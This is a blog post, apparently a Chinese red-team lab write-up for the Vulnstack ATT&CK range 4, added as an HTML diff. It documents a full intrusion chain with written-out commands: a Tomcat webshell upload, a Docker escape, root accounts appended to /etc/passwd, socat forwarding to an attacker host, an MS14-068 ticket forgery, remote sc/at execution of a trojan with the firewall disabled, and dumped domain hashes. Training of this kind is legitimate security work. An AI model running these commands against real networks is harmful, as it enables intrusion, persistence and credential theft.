@@ -1,0 +1,608 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>ATT&amp;CK红队评估实战靶场-4 | X1NRI</title>
+  <meta name="author" content="X1NRI">
+  
+  <meta name="description" content="下载地址：漏洞详情
+
+
+网络搭建ubuntu:ubuntu
+192.168.74.140
+192.168.183.128
+
+域成员机器
+douser:Dotest123
+192.168.183.129
+
+DC
+administrator:Test2008
+192.168.183.130
+
+环境搭建
+web机器
+cd /home/ubuntu/Desktop/vulhub/struts2/s2-045
+sudo docker-compose up -d
+cd /home/ubuntu/Desktop/vulhub/tomcat/CVE-2017-12615/
+sudo docker-compose up -d
+cd /home/ubuntu/Desktop/vulhub/phpmyadmin/CVE-2018-12613/
+sudo docker-compose up -d
+
+win7win7总是挂起，修改设备计划
+
+
+边界信息搜集goby上去打些常见poc，随便把端口扫了
+tomcat PUT 任意文件上传（CVE-2017-12615）"> 
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="ATT&amp;CK红队评估实战靶场-4"/>
+  <meta property="og:site_name" content="X1NRI"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+    <link rel="alternative" href="/atom.xml" title="X1NRI" type="application/atom+xml">
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-70812759-1');
+</script>
+
+
+
+
+
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">X1NRI</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class="fa fa-archive"></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/categories" title="All the categories.">
+			  <i class="fa fa-folder"></i>Categories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="All the tags.">
+			  <i class="fa fa-tags"></i>Tags
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="About me.">
+			  <i class="fa fa-user"></i>About
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/links" title="Subscribe me.">
+			  <i class="fa fa-chain"></i>Links
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> ATT&amp;CK红队评估实战靶场-4</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <blockquote>
+<p>下载地址：<a target="_blank" rel="noopener" href="http://vulnstack.qiyuanxuetang.net/vuln/detail/6/">漏洞详情</a></p>
+</blockquote>
+<p><img src="/Rxi134_FILE/01e760a174b100ab764f690ba82aaa18_MD5.jpeg"></p>
+<h1 id="网络搭建"><a href="#网络搭建" class="headerlink" title="网络搭建"></a>网络搭建</h1><pre class="line-numbers language-text" data-language="text"><code class="language-text">ubuntu:ubuntu
+192.168.74.140
+192.168.183.128
+
+域成员机器
+douser:Dotest123
+192.168.183.129
+
+DC
+administrator:Test2008
+192.168.183.130<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><ul>
+<li><p>web机器</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /home/ubuntu/Desktop/vulhub/struts2/s2-045
+<span class="token function">sudo</span> <span class="token function">docker-compose</span> up <span class="token parameter variable">-d</span>
+<span class="token builtin class-name">cd</span> /home/ubuntu/Desktop/vulhub/tomcat/CVE-2017-12615/
+<span class="token function">sudo</span> <span class="token function">docker-compose</span> up <span class="token parameter variable">-d</span>
+<span class="token builtin class-name">cd</span> /home/ubuntu/Desktop/vulhub/phpmyadmin/CVE-2018-12613/
+<span class="token function">sudo</span> <span class="token function">docker-compose</span> up <span class="token parameter variable">-d</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+</li>
+<li><p>win7<br>win7总是挂起，修改设备计划<br><img src="/Rxi134_FILE/393f5041cfd50e06414cf2e793ebb750_MD5.jpeg"></p>
+</li>
+</ul>
+<h1 id="边界"><a href="#边界" class="headerlink" title="边界"></a>边界</h1><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>goby上去打些常见poc，随便把端口扫了<br><img src="/Rxi134_FILE/3243933a3096253353d76f94faab9aad_MD5.jpeg"></p>
+<h2 id="tomcat-PUT-任意文件上传（CVE-2017-12615）"><a href="#tomcat-PUT-任意文件上传（CVE-2017-12615）" class="headerlink" title="tomcat PUT 任意文件上传（CVE-2017-12615）"></a>tomcat PUT 任意文件上传（CVE-2017-12615）</h2><p>tomcat 远程代码执行<br><img src="/Rxi134_FILE/d2eb0872f91e3d5bd9d08ed7f81b9c4f_MD5.jpeg"></p>
+<p>工具直接梭哈，上传webshell<br><img src="/Rxi134_FILE/f39cc38d710b6095f7052a0ee7c05174_MD5.jpeg"></p>
+<p>拿到root<br><img src="/Rxi134_FILE/731948ac195fef247d2ebc37dfc1b985_MD5.jpeg"></p>
+<p>看了ip傻眼了，172.18.0.2 ？</p>
+<pre class="line-numbers language-text" data-language="text"><code class="language-text">(root:/tmp) $ uname -a
+Linux 09dd4e5bfa91 4.4.0-142-generic #168~14.04.1-Ubuntu SMP Sat Jan 19 11:26:28 UTC 2019 x86_64 GNU/Linux
+(root:/tmp) $ ip addr
+1: lo: &lt;LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+10: eth0@if11: &lt;BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
+    link/ether 02:42:ac:12:00:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0
+    inet 172.18.0.2/16 brd 172.18.255.255 scope global eth0
+       valid_lft forever preferred_lft forever<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>果真在docker环境里<br><img src="/Rxi134_FILE/a309f4c888102752232fb3451e5877dd_MD5.jpeg"></p>
+<h2 id="docker逃逸（特权模式）"><a href="#docker逃逸（特权模式）" class="headerlink" title="docker逃逸（特权模式）"></a>docker逃逸（特权模式）</h2><p><img src="/Rxi134_FILE/6d4ca50e62f8d898a4113a5292a501cb_MD5.jpeg"></p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mkdir</span> /test 
+<span class="token function">mount</span> /dev/sda1 /test<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>成功逃逸到宿主机，只有用户ubuntu和root<br><img src="/Rxi134_FILE/0b934d83681779a4e07c3145ed0907ff_MD5.jpeg"></p>
+<h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><h3 id="失败思路1-修改-etc-passwd直接root-ssh"><a href="#失败思路1-修改-etc-passwd直接root-ssh" class="headerlink" title="失败思路1. 修改&#x2F;etc&#x2F;passwd直接root ssh"></a>失败思路1. 修改&#x2F;etc&#x2F;passwd直接root ssh</h3><p>修改passwd</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">"rxi134:\<span class="token variable">$1</span>\<span class="token variable">$rxi134</span>\<span class="token variable">$a</span>/DG862QDtnw0tapAC9vv0:0:0:root:/root:/bin/bash"</span> <span class="token operator">>></span> ./etc/passwd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>但是无法ssh上去<br><img src="/Rxi134_FILE/100477502cab9435adb13719df71db50_MD5.jpeg"></p>
+<p>查看sshd_config，原来是禁用了root ssh</p>
+<h3 id="失败思路2-拿走私钥文件直接ssh"><a href="#失败思路2-拿走私钥文件直接ssh" class="headerlink" title="失败思路2. 拿走私钥文件直接ssh"></a>失败思路2. 拿走私钥文件直接ssh</h3><p>私钥文件有密码原语，解不开<br><img src="/Rxi134_FILE/6171339c219a84d2cb82acfad7ac5927_MD5.jpeg"></p>
+<h3 id="成功思路3-创建普通用户，ssh上去再提升到root"><a href="#成功思路3-创建普通用户，ssh上去再提升到root" class="headerlink" title="成功思路3. 创建普通用户，ssh上去再提升到root"></a>成功思路3. 创建普通用户，ssh上去再提升到root</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">└─$ openssl <span class="token function">passwd</span> <span class="token parameter variable">-1</span> <span class="token parameter variable">-salt</span> hacker <span class="token number">123456</span>
+<span class="token variable">$1</span><span class="token variable">$hacker</span><span class="token variable">$6luIRwdGpBvXdP</span>.GMwcZp/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+
+<pre class="line-numbers language-text" data-language="text"><code class="language-text">ubuntu:x:1000:1000:ubuntu,,,:/home/ubuntu:/bin/bash
+hacker:$1$hacker$6luIRwdGpBvXdP.GMwcZp/:1000:1000:ubuntu:/home/ubuntu:/bin/bash<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">"hacker:\<span class="token variable">$1</span>\<span class="token variable">$hacker</span>\<span class="token variable">$6luIRwdGpBvXdP</span>.GMwcZp/:1000:1000:ubuntu:/home/ubuntu:/bin/bash"</span> <span class="token operator">>></span> ./etc/passwd
+<span class="token builtin class-name">echo</span> <span class="token string">"rxi134:\<span class="token variable">$1</span>\<span class="token variable">$rxi134</span>\<span class="token variable">$a</span>/DG862QDtnw0tapAC9vv0:0:0:root:/root:/bin/bash"</span> <span class="token operator">>></span> ./etc/passwd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>su rxi134<br><img src="/Rxi134_FILE/930f8e22fd8868e1bbdce41aef1f9629_MD5.jpeg"></p>
+<h3 id="上线CS"><a href="#上线CS" class="headerlink" title="上线CS"></a>上线CS</h3><p><img src="/Rxi134_FILE/6b35d8a0fc2be78c01770cdc0b92d82a_MD5.jpeg"></p>
+<h2 id="搭建socks代理"><a href="#搭建socks代理" class="headerlink" title="搭建socks代理"></a>搭建socks代理</h2><p>喜欢用chisel<br><img src="/Rxi134_FILE/9b83bce5f65cf23056eebea5735c93c7_MD5.jpeg"></p>
+<h1 id="内网"><a href="#内网" class="headerlink" title="内网"></a>内网</h1><h2 id="fscan大保健"><a href="#fscan大保健" class="headerlink" title="fscan大保健"></a>fscan大保健</h2><p>内网 ip 为 192.168.183.128，存在内网网段 192.168.183.0&#x2F;24<br><img src="/Rxi134_FILE/03c55c88c226fd1feab4204dac98fc63_MD5.jpeg"></p>
+<pre class="line-numbers language-text" data-language="text"><code class="language-text">start infoscan
+(icmp) Target 192.168.183.131 is alive
+(icmp) Target 192.168.183.130 is alive
+(icmp) Target 192.168.183.134 is alive
+[*] Icmp alive hosts len is: 3
+192.168.183.134:139 open
+192.168.183.134:135 open
+192.168.183.130:139 open
+192.168.183.130:135 open
+192.168.183.131:22 open
+192.168.183.130:88 open
+192.168.183.134:445 open
+192.168.183.130:445 open
+[*] alive ports len is: 8
+start vulscan
+[*] NetInfo 
+[*]192.168.183.134
+   [->]TESTWIN7-PC
+   [->]192.168.183.134
+[*] NetInfo 
+[*]192.168.183.130
+   [->]WIN-ENS2VR5TR3N
+   [->]192.168.183.130
+[+] MS17-010 192.168.183.130	(Windows Server 2008 HPC Edition 7601 Service Pack 1)
+[*] NetBios 192.168.183.130 [+] DC:WIN-ENS2VR5TR3N.demo.com      Windows Server 2008 HPC Edition 7601 Service Pack 1
+[+] MS17-010 192.168.183.134	(Windows 7 Enterprise 7601 Service Pack 1)
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="永恒之蓝拿下用户机"><a href="#永恒之蓝拿下用户机" class="headerlink" title="永恒之蓝拿下用户机"></a>永恒之蓝拿下用户机</h2><p>proxychains走代理，msf打永恒之蓝</p>
+<p>我的wsl出了点问题，先用kali继续</p>
+<ul>
+<li><p>尝试：chisel搭建隧道，proxychains+msf<br>?<br><img src="/Rxi134_FILE/d89f18c8c860f96dfdd30b985838fdf9_MD5.jpeg"></p>
+</li>
+<li><p>尝试：chisel搭建隧道，setg+msf<br><img src="/Rxi134_FILE/fb10a599aa9ce08d65dbd1294cff88d2_MD5.jpeg"><br>nnd终于成功了，拿下 TESTWIN7-PC</p>
+</li>
+</ul>
+<h2 id="信息搜集-1"><a href="#信息搜集-1" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>systeminfo</p>
+<pre class="line-numbers language-text" data-language="text"><code class="language-text">Host Name:                 TESTWIN7-PC
+OS Name:                   Microsoft Windows 7 企业版
+OS Version:                6.1.7601 Service Pack 1 Build 7601
+OS Manufacturer:           Microsoft Corporation
+OS Configuration:          Member Workstation
+OS Build Type:             Multiprocessor Free
+Registered Owner:          testwin7
+Registered Organization:
+Product ID:                00392-918-5000002-85176      
+Original Install Date:     2019/12/31, 10:38:42
+System Boot Time:          2024/11/13, 17:27:48
+System Manufacturer:       VMware, Inc.
+System Model:              VMware Virtual Platform
+System Type:               x64-based PC
+Processor(s):              1 Processor(s) Installed.
+                           [01]: Intel64 Family 6 Model 183 Stepping 1 GenuineIntel ~2419 Mhz
+BIOS Version:              Phoenix Technologies LTD 6.00, 2020/11/12
+Windows Directory:         C:\Windows
+System Directory:          C:\Windows\system32
+Boot Device:               \Device\HarddiskVolume1
+System Locale:             zh-cn;Chinese (China)
+Input Locale:              zh-cn;Chinese (China)
+Time Zone:                 (UTC+08:00) Beijing, Chongqing, Hong Kong, Urumqi   
+Total Physical Memory:     2,047 MB
+Available Physical Memory: 1,483 MB
+Virtual Memory: Max Size:  4,095 MB
+Virtual Memory: Available: 3,415 MB
+Virtual Memory: In Use:    680 MB
+Page File Location(s):     C:\pagefile.sys
+Domain:                    demo.com
+Logon Server:              N/A
+Hotfix(s):                 37 Hotfix(s) Installed.
+                           [01]: KB2491683
+                           [02]: KB2534111
+                           [03]: KB2564958
+                           [04]: KB2621440
+                           [05]: KB2653956
+                           [06]: KB2654428
+                           [07]: KB2698365
+                           [08]: KB2705219
+                           [09]: KB2736422
+                           [10]: KB2813430
+                           [11]: KB2900986
+                           [12]: KB2937610
+                           [13]: KB2943357
+                           [14]: KB2978120
+                           [15]: KB2984972
+                           [16]: KB2992611
+                           [17]: KB2999226
+                           [18]: KB3004375
+                           [19]: KB3010788
+                           [20]: KB3023215
+                           [21]: KB3031432
+                           [22]: KB3035126
+                           [23]: KB3037574
+                           [24]: KB3045685
+                           [25]: KB3046269
+                           [26]: KB3072305
+                           [27]: KB3074543
+                           [28]: KB3086255
+                           [29]: KB3097989
+                           [30]: KB3101722
+                           [31]: KB3108371
+                           [32]: KB3122648
+                           [33]: KB3127220
+                           [34]: KB3155178
+                           [35]: KB4019990
+                           [36]: KB4040980
+                           [37]: KB976902
+Network Card(s):           1 NIC(s) Installed.
+                           [01]: Intel(R) PRO/1000 MT Network Connection
+                                 Connection Name: 本地连接
+                                 DHCP Enabled:    Yes
+                                 DHCP Server:     192.168.183.254
+                                 IP address(es)
+                                 [01]: 192.168.183.163
+                                 [02]: fe80::4c2e:5407:57a4:6774
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>net user</p>
+<pre class="line-numbers language-text" data-language="text"><code class="language-text">net user
+
+User accounts for \\
+
+-------------------------------------------------------------------------------
+Administrator            Guest                    testclone                
+The command completed with one or more errors.
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="抓取密码"><a href="#抓取密码" class="headerlink" title="抓取密码"></a>抓取密码</h2><p><img src="/Rxi134_FILE/6389f0a064aef1e980bf82e49c8e0a7c_MD5.jpeg"><br>抓取到一个域用户</p>
+<pre class="line-numbers language-text" data-language="text"><code class="language-text">DEMO.COM\douser:Dotest123<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+<p>启用远程桌面</p>
+<pre class="line-numbers language-text" data-language="text"><code class="language-text">reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/Rxi134_FILE/ee749addb2577ec9d67e3c2cf2f68e94_MD5.jpeg"></p>
+<p>psexec也不行，这个用户权限很低</p>
+<h2 id="bloodhound"><a href="#bloodhound" class="headerlink" title="bloodhound"></a>bloodhound</h2><p>powershell和exe都执行不了<br><img src="/Rxi134_FILE/e2bf6b25542ad8d2f95f89e951443530_MD5.jpeg"><br><img src="/Rxi134_FILE/1c0c79ea710ccf955aa70a858c8485be_MD5.jpeg"></p>
+<h2 id="进程注入"><a href="#进程注入" class="headerlink" title="进程注入"></a>进程注入</h2><p>可以注入 douser 进程<br><img src="/Rxi134_FILE/c8931aa921f9970f739345226ea4ed55_MD5.jpeg"></p>
+<h2 id="上线CS-1"><a href="#上线CS-1" class="headerlink" title="上线CS"></a>上线CS</h2><p>利用socat转发端口</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">socat <span class="token parameter variable">-d</span> TCP4-LISTEN:80,fork TCP4:192.168.74.149:80<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/Rxi134_FILE/947ec3d4750c8e1317bbed6d7bb3283e_MD5.jpeg"></p>
+<p>生成一个stagerless木马，反弹到 web机 的内网ip<br><img src="/Rxi134_FILE/86f39596d404cd86cbbac7bf1e8679b7_MD5.jpeg"></p>
+<h2 id="ms14-068提升至域管"><a href="#ms14-068提升至域管" class="headerlink" title="ms14-068提升至域管"></a>ms14-068提升至域管</h2><p>demo\douser的SID：</p>
+<pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">PS&gt; whoami &#x2F;all
+demo\douser S-1-5-21-979886063-1111900045-1414766810-1107<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>域名全称为</p>
+<pre class="line-numbers language-text" data-language="text"><code class="language-text">DEOM.COM<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+<p>生成伪造的ccache票据</p>
+<pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">MS14-068.exe -u douser@demo.com -p Dotest123 -s S-1-5-21-979886063-1111900045-1414766810-1107 -d 192.168.183.130<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/Rxi134_FILE/8333a0c0d7a7ed970b5c42410804547e_MD5.jpeg"></p>
+<p>445端口好像有问题（可能是永恒之蓝打坏了），ipc挂载不了</p>
+<p>上传mimikatz和伪造的票据<br><img src="/Rxi134_FILE/14b2b4b286ee467d68f1e9619bb4db36_MD5.jpeg"></p>
+<p>runas 移动到 demo.com\dousr 用户<br><img src="/Rxi134_FILE/d578b807b9be56dd55a96d62d70d22f0_MD5.jpeg"></p>
+<p>导入票据到内存<br><img src="/Rxi134_FILE/48ec8dacc2be34ab01d0f38cc2419e94_MD5.jpeg"></p>
+<p>芜湖<br><img src="/Rxi134_FILE/cb3088967ed54dcc07ebfba95ef5a243_MD5.jpeg"></p>
+<h2 id="ipc-sc尝试拿下域控"><a href="#ipc-sc尝试拿下域控" class="headerlink" title="ipc+sc尝试拿下域控"></a>ipc+sc尝试拿下域控</h2><p>ipc搭配sc，顺便把防火墙关了</p>
+<pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">net use \\WIN-ENS2VR5TR3N\ipc$
+copy muma.exe \\WIN-ENS2VR5TR3N\c$
+dir \\WIN-ENS2VR5TR3N\c$ |findstr muma
+sc \\WIN-ENS2VR5TR3N create firewalldown binpath&#x3D; &quot;netsh advfirewall set allprofiles state off&quot; start&#x3D; auto 
+sc \\WIN-ENS2VR5TR3N create muma binpath&#x3D; &quot;c:\muma.exe&quot; start&#x3D; auto
+sc start firewalldown
+sc start muma<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>但是cobaltstrike上线一会就断掉了，不明所以，登上桌面看看<br><img src="/Rxi134_FILE/3cb6c9fbaf1bcec7836d88df0226c512_MD5.jpeg"><br>🤔</p>
+<h2 id="ipc-at拿下域控"><a href="#ipc-at拿下域控" class="headerlink" title="ipc+at拿下域控"></a>ipc+at拿下域控</h2><p>创建计划任务来执行木马</p>
+<pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">C:\&gt;net time \\WIN-ENS2VR5TR3N
+\\WIN-ENS2VR5TR3N 的当前时间是 2024&#x2F;11&#x2F;16 20:55:10
+
+C:\&gt;at \\WIN-ENS2VR5TR3N 20:55:30 C:\ma2.exe
+新加了一项作业，其作业 ID &#x3D; 2
+
+C:\&gt;at \\WIN-ENS2VR5TR3N
+状态 ID     日期                    时间          命令行
+-------------------------------------------------------------------
+        1   明天                    20:51         C:\ma2.exe
+        2   今天                    20:55         C:\ma2.exe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+<p>爽了<br><img src="/Rxi134_FILE/8dd49eb4052f992ac0674c44efaa3806_MD5.jpeg"></p>
+<p>hashdump抓取krbtgt hash</p>
+<pre class="line-numbers language-text" data-language="text"><code class="language-text">Administrator:500:aad3b435b51404eeaad3b435b51404ee:97dab5a8641ed01e064a6c3957980405:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:7c4ed692473d4b4344c3ba01c5e6cb63:::
+douser:1103:aad3b435b51404eeaad3b435b51404ee:bc23b0b4d5bf5ff42bc61fb62e13886e:::
+WIN-ENS2VR5TR3N$:1000:aad3b435b51404eeaad3b435b51404ee:61562eb872832ff0d87e1c7ab6daeac2:::<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>mimikatz抓取到明文密码（因为密码过期，所以我事先改掉了），<code>DEMO.COM\administrator:Test20088</code><br><img src="/Rxi134_FILE/08d1f8b77d203a94687218320330daa3_MD5.jpeg"></p>
+
+	  <div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+</div>
+
+	</div>
+
+	
+	<span id="/2024/11/16/ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA-4/" class="leancloud-visitors view" data-flag-title="ATT&amp;CK红队评估实战靶场-4">
+		<em class="post-meta-item-text"> Page View </em> <i class="leancloud-visitors-count"></i>
+	</span>
+	
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a type="button" class="btn btn-default disabled"><i class="fa fa-arrow-circle-o-left"></i>Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2024/10/15/春秋云镜-Initial/" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+		<section id="comments" class="comments">
+			<style>
+			.comments{margin:30px;padding:10px;background:rgb(0, 0, 0)}
+			@media screen and (max-width:800px){.comments{margin:auto;padding:10px;background:#000}}
+			</style>
+			<div id="vcomment" class="comment"></div>
+<script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+<script src="https://cdnjs.loli.net/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+<script>
+var valineConfig = {"enable":true,"appId":"QrmzEeS3e4xvmJxO1dSPlkW4-gzGzoHsz","appKey":"ov6uvwKnDQmJxtpeS0wvBIwL","placeholder":"","visitor":true,"avatar":"monsterid","requiredFields":["nick","mail"],"pageView":true}
+valineConfig.el='#vcomment';
+new Valine(valineConfig);
+    // new Valine({
+    //     el: '#vcomment',
+    //     appId: "",
+    //     appKey: "",
+    //     placeholder: "",
+    //     avatar:"monsterid",
+    //     visitor: "true",
+    //     requiredFields: "nick,mail".split(','),
+    // });
+</script>
+
+		</section>
+	
+	
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2024-11-16 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/进攻性渗透测试/">进攻性渗透测试<span>7</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+	
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
+    <ul id="tags" class="tag_box list-unstyled collapse in">	  
+	    
+  <li><a href="/tags/Vulnstack靶场/">Vulnstack靶场<span>3</span></a></li>
+    </ul>
+	</div>
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
+	   <div id="toc" class="toc collapse in">
+		   <span class="toc-title">Contents</span>
+			<ol class="toc-article"><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#%E7%BD%91%E7%BB%9C%E6%90%AD%E5%BB%BA"><span class="toc-article-text">网络搭建</span></a></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-article-text">环境搭建</span></a></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#%E8%BE%B9%E7%95%8C"><span class="toc-article-text">边界</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-article-text">信息搜集</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#tomcat-PUT-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%EF%BC%88CVE-2017-12615%EF%BC%89"><span class="toc-article-text">tomcat PUT 任意文件上传（CVE-2017-12615）</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#docker%E9%80%83%E9%80%B8%EF%BC%88%E7%89%B9%E6%9D%83%E6%A8%A1%E5%BC%8F%EF%BC%89"><span 